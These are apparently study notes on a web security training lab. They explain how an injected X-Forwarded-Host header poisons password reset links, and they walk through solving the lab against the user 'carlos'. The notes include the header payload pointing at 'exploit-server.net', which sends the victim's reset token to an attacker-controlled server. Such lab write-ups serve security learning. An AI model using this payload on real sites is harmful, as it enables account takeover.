âœ… 1. What is X-Forwarded-Host?
X-Forwarded-Host is an HTTP header used when a website is behind a reverse proxy or load balancer (like Nginx, AWS ELB, or a cloud firewall).

It tells the backend server what the original hostname in the URL was â€” like:

makefile
Copy
Edit
X-Forwarded-Host: exploit-server.net
So if a user visited:

pgsql
Copy
Edit
http://exploit-server.net/reset-password
but the backend runs at internal.vuln-site.com, the header tells the app what the real host was.

ðŸ§¨ The Problem:
If the backend blindly uses this header to create links (like a reset password URL), and you can inject a fake hostname, you can poison the link and trick someone (like Carlos) into clicking it.

ðŸ§  2. What is Middleware?
Middleware is software that sits between the HTTP request and the main application (like Express middleware in Node.js or filters in Java/Spring).

It might:

Log requests

Add headers

Authenticate requests

Handle routing or security

If middleware reads X-Forwarded-Host and passes it to the app, the app may trust this value and use it to build reset links, emails, etc.

ðŸ”“ 3. Password Reset Poisoning via Middleware
Hereâ€™s how the vulnerability works:

You request a password reset for Carlos.

The server sends Carlos a reset link:

perl
Copy
Edit
https://vulnerable-website.com/reset-password?token=xyz
But the app builds this link using X-Forwarded-Host, so if you send:

makefile
Copy
Edit
X-Forwarded-Host: exploit-server.net
âžœ The reset link becomes:

pgsql
Copy
Edit
https://exploit-server.net/reset-password?token=xyz
Carlos clicks the reset link from his email âžœ sent to your exploit server.

You capture the token and use it to reset Carlosâ€™s password and log in.

LAB PROCESS

It is also a simple lab in this lab in post forget password request change the username to carlos and then change the X-Forwarded-Host: to exploit server and then carlos will click on link and the temp reset pass token will sent to exploit server use that to change his password and BOOM ! Lab is solved.
